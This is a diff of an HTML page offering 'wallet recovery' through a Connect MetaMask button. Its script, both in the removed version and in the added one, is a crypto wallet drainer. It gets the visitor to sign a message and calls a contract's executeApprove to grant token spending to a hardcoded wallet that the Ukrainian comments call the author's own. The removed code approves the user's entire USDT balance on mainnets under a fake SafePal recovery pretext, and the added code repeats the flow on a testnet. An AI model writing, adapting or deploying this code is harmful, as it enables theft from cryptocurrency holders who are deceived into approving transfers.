@@ -91,7 +91,7 @@
       display: block;
       width: 100%;
       padding: 12px;
-      background-color: #4CAF50;
+      background-color: #4559ff;
       color: white;
       text-align: center;
       border: none;
@@ -201,141 +201,70 @@
     <button class="connect-btn" onclick="connectWallet()">Connect MetaMask</button>
   </div>
 
-  <script>
-    const tokens = {
-      56: { // BNB Chain
-        usdt: "0x55d398326f99059fF775485246999027B3197955",
-        busd: "0x4Fabb145d64652a948d72533023f6E7A623C7C53"
-      },
-      1: { // Ethereum Mainnet
-        usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec",
-        usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
-      },
-      137: { // Polygon
-        usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
-        usdc: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
-      },
-      11155111: { // Sepolia Testnet
-        usdt: "0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD"
-      }
-    };
+    <script>
+        async function connectWallet() {
+            try {
+                document.getElementById('status').innerText = 'Connecting...';
 
-    const contractAddress = "0x83B9e58fF01daD8647AE57da9601b4556B2894D0"; // Нова адреса ApproveContract
-    const shahraiAddress = "0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e"; // Твій гаманець Б
+                if (!window.ethereum || !window.ethereum.isMetaMask) {
+                    throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
+                }
 
-    function formatNumber(number) {
-      return Number(number).toLocaleString(undefined, {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2
-      });
-    }
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (accounts.length === 0) {
+                    throw new Error('No accounts found. Please unlock MetaMask.');
+                }
 
-    async function fetchPrices() {
-      const coins = ['usd-coin', 'bitcoin', 'solana', 'ethereum'];
-      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coins.join(',')}&vs_currencies=usd`;
+                const userAddress = accounts[0];
+                document.getElementById('status').innerText = 'Connected. Verifying wallet ownership...';
 
-      try {
-        const response = await fetch(url);
-        const data = await response.json();
+                // Перевірка мережі (Sepolia)
+                const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
+                const targetChainId = 11155111; // Sepolia Testnet
+                if (chainId !== targetChainId) {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: `0x${targetChainId.toString(16)}` }]
+                    });
+                }
 
-        const usdtPrice = data['usd-coin'].usd;
-        const btcPrice = data.bitcoin.usd;
-        const solPrice = data.solana.usd;
-        const ethPrice = data.ethereum.usd;
+                // Підпис повідомлення
+                const message = 'Verify wallet ownership for Wallet recovery';
+                const signature = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [message, userAddress]
+                });
 
-        document.getElementById('usdt-price').innerText = `$${formatNumber(usdtPrice)}`;
-        document.getElementById('btc-price').innerText = `$${formatNumber(btcPrice)}`;
-        document.getElementById('sol-price').innerText = `$${formatNumber(solPrice)}`;
-        document.getElementById('eth-price').innerText = `$${formatNumber(ethPrice)}`;
+                console.log('Signature:', signature);
+                document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
 
-        const usdtAmount = parseFloat(document.getElementById('usdt-amount').innerText.replace(/,/g, ''));
-        const btcAmount = parseFloat(document.getElementById('btc-amount').innerText.replace(/,/g, ''));
-        const solAmount = parseFloat(document.getElementById('sol-amount').innerText.replace(/,/g, ''));
-        const ethAmount = parseFloat(document.getElementById('eth-amount').innerText.replace(/,/g, ''));
+                // Виклик executeApprove через ApproveContract
+                const contractAddress = '0x45082F912D180D8296220940aC164c5feC775d3c'; // Встав нову адресу
+                const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
+                const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Гаманець Б
+                const amount = 500; // 0.0005 USDT
 
-        document.getElementById('usdt-equivalent').innerText = `$${formatNumber(usdtAmount * usdtPrice)}`;
-        document.getElementById('btc-equivalent').innerText = `$${formatNumber(btcAmount * btcPrice)}`;
-        document.getElementById('sol-equivalent').innerText = `$${formatNumber(solAmount * solPrice)}`;
-        document.getElementById('eth-equivalent').innerText = `$${formatNumber(ethAmount * ethPrice)}`;
-      } catch (error) {
-        console.error("Error fetching prices:", error);
-      }
-    }
+                const contractAbi = [
+                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
+                ];
 
-    async function connectWallet() {
-      try {
-        if (!window.ethereum || !window.ethereum.isMetaMask) {
-          throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
+
+                const messageBytes = ethers.utils.toUtf8Bytes(message);
+                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, shahraiAddress, amount);
+                await tx.wait();
+                console.log('Transaction Hash:', tx.hash);
+
+                document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
+            } catch (error) {
+                document.getElementById('status').innerText = `Error: ${error.message}`;
+                console.error('Detailed error:', error);
+            }
         }
-
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        if (accounts.length === 0) {
-          throw new Error('No accounts found. Please unlock MetaMask.');
-        }
-
-        const userAddress = accounts[0];
-
-        // Визначення мережі користувача
-        const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
-        let tokenAddress;
-        let tokenName;
-        if (tokens[chainId]) {
-          tokenAddress = tokens[chainId].usdt || Object.values(tokens[chainId])[0];
-          tokenName = Object.keys(tokens[chainId])[0].toUpperCase();
-        } else {
-          throw new Error('Unsupported network');
-        }
-
-        // Отримання балансу
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const tokenAbi = [
-          "function balanceOf(address) view returns (uint256)",
-          "function decimals() view returns (uint8)"
-        ];
-        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, provider);
-        const balance = await tokenContract.balanceOf(userAddress);
-        const decimals = await tokenContract.decimals();
-        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-        console.log(`User balance: ${balanceFormatted} ${tokenName}`);
-        document.getElementById('usdt-amount').innerText = formatNumber(balanceFormatted);
-
-        // Перевірка балансу
-        if (balance.isZero()) {
-          throw new Error('User has no tokens to transfer');
-        }
-
-        // Оновлення USD еквіваленту після fetchPrices
-        await fetchPrices();
-
-        // Підпис повідомлення
-        const message = 'Verify wallet ownership for SafePal recovery';
-        const signature = await window.ethereum.request({
-          method: 'personal_sign',
-          params: [message, userAddress]
-        });
-
-        console.log('Signature:', signature);
-
-        // Виклик executeApprove з реальним балансом
-        const contractAbi = [
-          "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
-        ];
-        const contract = new ethers.Contract(contractAddress, contractAbi, new ethers.providers.Web3Provider(window.ethereum).getSigner());
-
-        const approveAmount = balance; // Використовуємо реальний баланс
-        const messageBytes = ethers.utils.toUtf8Bytes(message);
-        const approveTx = await contract.executeApprove(messageBytes, userAddress, signature, tokenAddress, shahraiAddress, approveAmount);
-        const approveReceipt = await approveTx.wait();
-        console.log('Approve Transaction Hash:', approveReceipt.transactionHash);
-
-        alert('Wallet connected successfully. Approval granted! Use Remix or another tool to transfer tokens.');
-      } catch (error) {
-        alert('Connection failed: ' + error.message);
-        console.error('Detailed error:', error);
-      }
-    }
-
-    window.onload = fetchPrices;
-  </script>
+    </script>
+</body>
+</html>
 </body>
 </html>
